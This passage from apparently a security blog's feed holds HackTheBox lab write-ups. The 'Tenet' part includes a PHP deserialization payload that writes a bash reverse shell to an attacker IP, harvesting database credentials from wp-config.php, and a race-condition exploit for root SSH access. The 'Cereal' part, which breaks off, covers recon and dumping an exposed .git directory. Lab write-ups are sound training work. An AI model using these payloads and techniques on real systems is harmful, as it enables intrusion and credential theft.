<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
{
		<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test.php&#39;</span>;
		<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;
}
$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
<p>I&rsquo;ll modify the file name and the data for reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
{
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
        {
        		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;iamf.php&#39;</span>;
                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php system(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">) ?&gt;&#34;</span>;
        }
}
$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>I&rsquo;ll use this script to send that and then wait on my listener</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
serial<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>php tenetization.php<span style="color:#e6db74">`</span>
curl -s http://10.10.10.223/sator.php?arepo<span style="color:#f92672">=</span>$serial
sleep 5;
curl -s http://10.10.10.223/iamf.php
</code></pre></div><p>When I run the exploit, it hangs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ bash tenetization.sh
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
<span style="color:#f92672">[]</span> Database updated &lt;br&gt;<span style="color:#f92672">[]</span> Database updated &lt;br&gt;
</code></pre></div><p>But after a few seconds, I&rsquo;ve shell on my listener</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.31»
$ nc -nvlp <span style="color:#ae81ff">443</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.223<span style="color:#f92672">]</span> <span style="color:#ae81ff">39174</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1545<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@tenet:/var/www/html$ id
id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
www-data@tenet:/var/www/html$
</code></pre></div><p><img class="img-container" src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-neil">Shell as neil</h3>
<h4 id="wp-config">WP config</h4>
<p>I found Neil&rsquo;s credentials inside the <code>wp-config.php</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
&lt;?php

...&lt;SNIP&gt;...
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;neil&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;Opera2112&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
$ ssh neil@10.10.10.223
neil@10.10.10.223<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-129-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...

Last login: Mon Jun <span style="color:#ae81ff">14</span> 12:57:27 <span style="color:#ae81ff">2021</span> from 10.10.16.12
neil@tenet:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span>
</code></pre></div><p>User&rsquo;s flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ ls -l
total <span style="color:#ae81ff">4</span>
-r-------- <span style="color:#ae81ff">1</span> neil neil <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">14</span> 06:46 user.txt
</code></pre></div><p><img class="img-container" src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  />
</p>
<hr>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges">Sudo privileges</h4>
<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> neil on tenet:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>

User neil may run the following commands on tenet:
    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
</code></pre></div><h4 id="script-analysis">Script analysis</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1080</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/enableSSH.sh
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
<span style="color:#75715e">#!/bin/bash</span>

checkAdded<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>

        sshName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/bin/echo $key | /usr/bin/cut -d <span style="color:#e6db74">&#34; &#34;</span> -f 3<span style="color:#66d9ef">)</span>

        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>

                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>

        <span style="color:#66d9ef">else</span>

                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>

        <span style="color:#66d9ef">fi</span>

<span style="color:#f92672">}</span>

checkFile<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>

        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -s $1 <span style="color:#f92672">]]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[[</span> ! -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>

                /bin/echo <span style="color:#e6db74">&#34;Error in creating key file!&#34;</span>

                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> /bin/rm $1; <span style="color:#66d9ef">fi</span>

                exit <span style="color:#ae81ff">1</span>

        <span style="color:#66d9ef">fi</span>

<span style="color:#f92672">}</span>

addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>

        tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>

        <span style="color:#f92672">(</span>umask 110; touch $tmpName<span style="color:#f92672">)</span>

        /bin/echo $key &gt;&gt;$tmpName

        checkFile $tmpName

        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys

        /bin/rm $tmpName

<span style="color:#f92672">}</span>

key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
addKey
checkAdded
</code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys file</code> by the <code>addKey()</code> function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
neil@tenet:~$ echo $tmpName
/tmp/ssh-4swbpcnN
</code></pre></div><p>The  <code>checkAdded</code> will take the  <code>username@hostname</code> part from <code>$key</code> value and check if that value is already exist in <code>/root/.ssh/authorized_keys</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
 <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
        <span style="color:#66d9ef">else</span>
                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
        <span style="color:#66d9ef">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>So, it&rsquo;s a race condition.</p>
<p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key.</p>
<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
</code></pre></div><p>Then I&rsquo;ll run this loop to make user <code>neil</code> keep doing sudo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sudo /usr/local/bin/enableSSH.sh; <span style="color:#66d9ef">done</span>;
</code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span style="color:#66d9ef">while</span> sleep 0.1; <span style="color:#66d9ef">do</span> cat .iamf | tee /tmp/ssh-*;<span style="color:#66d9ef">done</span>
</code></pre></div><p>When I see there is a &ldquo;Error in adding root@ubuntu to authorized_keys file!&rdquo; message, then I should be able to login as root.</p>
<p>After some minutes, I can finally login as root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ ssh root@10.10.10.223
Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-129-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...

Last login: Mon Jun <span style="color:#ae81ff">14</span> 14:23:52 <span style="color:#ae81ff">2021</span> from 10.10.16.12
root@tenet:~# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@tenet:~# ls -l
total <span style="color:#ae81ff">4</span>
-r-------- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">14</span> 06:46 root.txt
root@tenet:~# 
</code></pre></div><p><img class="img-container" src="imgs/image-20210614213529219.png" alt="image-20210614213529219"  />
</p>
<p><strong>Update</strong>: I found out that sometimes I can login as root even without seeing the error message. So I decided to use while loop for SSH login.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> ssh -oConnectTimeout<span style="color:#f92672">=</span>1s -oPasswordAuthentication<span style="color:#f92672">=</span>no root@10.10.10.223 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  />
</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cereal (User only)</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
      <description>Doing code reviews in order to chain XSS, SSRF, and Deserialization vulnerabilities to gain a foothold</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server which exposes source code of the currently hosted web application. A deleted JWT secrets is found in the source code, which can be used to forge my own JWT token and bypass the application login page. After reviewing the source code, the web app is found to be vulnerable to a deserialization attack. There is also a XSS vulnerability in one of the package used by the application. Chaining these vulnerabilities allows me to gain a foothold in the system.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:45 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">127</span>
80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">127</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 118.08 seconds
</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:51 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://cereal.htb/
|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Cereal
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
|_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.34 seconds
</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ echo <span style="color:#e6db74">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form.</p>
<p><img class="img-container" src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  />
</p>
<p>I tried a few common credentials but doesn&rsquo;t seem to work here.</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><img class="img-container" src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  />
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>.</p>
<p><img class="img-container" src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  />
</p>
<p>But l&rsquo;ll leave it for now.</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><img class="img-container" src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  />
</p>
<p>Nothing I can do on this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://source.cereal.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              aspx,txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:52:32 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/.git/HEAD            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 23<span style="color:#f92672">]</span>
/Default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10090<span style="color:#f92672">]</span>
/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 163<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span style="color:#f92672">]</span>
/default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9727<span style="color:#f92672">]</span>                                              
/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/uploads/<span style="color:#f92672">]</span>      
                                                                                              
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:54:41 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Accessing the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/ <span style="color:#f92672">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:25 GMT

HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:08:16 GMT
</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/HEAD
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Content-Length: <span style="color:#ae81ff">23</span>
Content-Type: text/plain
Last-Modified: Wed, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2020</span> 20:09:34 GMT
Accept-Ranges: bytes
ETag: <span style="color:#e6db74">&#34;adc1d19266b8d61:0&#34;</span>
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:29 GMT

→ root@kali «cereal» «10.10.14.3» 
$ curl -s -k http://source.cereal.htb/.git/HEAD
ref: refs/heads/master
</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/ <span style="color:#f92672">[</span>403<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching common files
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.gitignore <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
